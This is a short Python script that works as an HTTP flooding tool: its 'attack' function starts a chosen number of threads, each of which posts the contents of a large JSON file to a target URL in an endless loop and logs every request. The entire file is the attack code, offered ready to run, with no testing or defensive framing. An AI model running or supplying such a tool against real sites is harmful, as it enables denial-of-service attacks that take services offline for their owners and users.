import threading
import requests
import json
import datetime

url1 = ""

f = open("large.json", "r")
json_data = json.dumps(str(f.readlines()))
f.close()

def do_request():
    while True:
        requests.post(url1, json_data)
        print('Request directed at: ' + url1 + '. Time: ' + str(datetime.datetime.now()))

        

def attack(threadcount, urlname):

    print(threadcount)
    print(urlname)
    
    global url1
    url1 = urlname

    threads = []

    for i in range(threadcount):
        t = threading.Thread(target=do_request)
        t.daemon = True
        threads.append(t)

    for i in range(threadcount):
        threads[i].start()

    for i in range(threadcount):
        threads[i].join()

f.close()